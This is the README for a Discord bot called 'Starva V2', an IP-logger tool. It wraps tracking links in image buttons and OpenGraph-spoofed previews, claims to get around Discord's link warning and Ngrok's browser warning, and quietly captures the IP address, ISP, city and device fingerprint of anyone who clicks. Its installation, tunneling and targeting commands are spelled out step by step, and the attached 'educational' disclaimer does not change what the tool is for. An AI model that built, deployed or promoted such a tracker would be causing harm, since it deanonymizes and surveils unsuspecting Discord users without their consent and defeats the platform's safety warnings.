## 🏷️ Tags
`#Discord-Nuke` `#IP-Logger` `#Starva-V2` `#Exploit` `#Discord-Exploitation`

🛠️ Core Capabilities
Stealth Infiltration: Masks tracking URLs behind an ActionRow Button interface for maximum click-through rates.
Discord Security Bypass: Engineered to bypass the "Discord Bot Link Warning" and Ngrok's browser warning screens.
Deep Logging: Extracts real-time data including Public IP, ISP, Country, City, and Device Fingerprint.
Media Masquerade: Uses OpenGraph (OG) spoofing to show legitimate image previews in the Discord chat window while the link logs data.
Instant Redirection: Once the data is captured, the victim is instantly redirected to the original HD media to avoid suspicion.
📦 Requirements & Installation
Before running the engine, ensure you have Node.js installed and an active Discord Bot Token.

1. Repository Setup
Bash
git clone https://github.com/your-username/starva-v2.git
cd starva-v2
2. Dependency Injection (NPM)
Install the required modules to initialize the Starva core:
Bash
npm install discord.js express axios dotenv colors
Required Packages:
discord.js: To communicate with the Discord API.
express: To host the silent tracking listener.
axios: For webhook data transmission and Geo-IP fetching.
dotenv: To encrypt and protect your bot tokens.
colors: For high-visibility terminal logs.

🚀 Deployment Guide
Initialize Tunneling: Launch Ngrok on your local port:
Bash
ngrok http 8080
Configure Environment: Insert your bot token in the .env file:
Cuplikan kode
TOKEN=YOUR_BOT_TOKEN_HERE
Execute Starva Engine:
Bash
node index.js
Targeting: Inside Discord, use the command: .createimagegrb [image_link]

⚠️ Legal & Security Disclaimer
This tool is intended for Educational Purposes, Penetration Testing, and Security Research only. Unauthorized use of this tool for malicious activities is strictly prohibited. The developer (APIS) is not liable for any damages caused by the misuse of this software.
Developed by Reverion
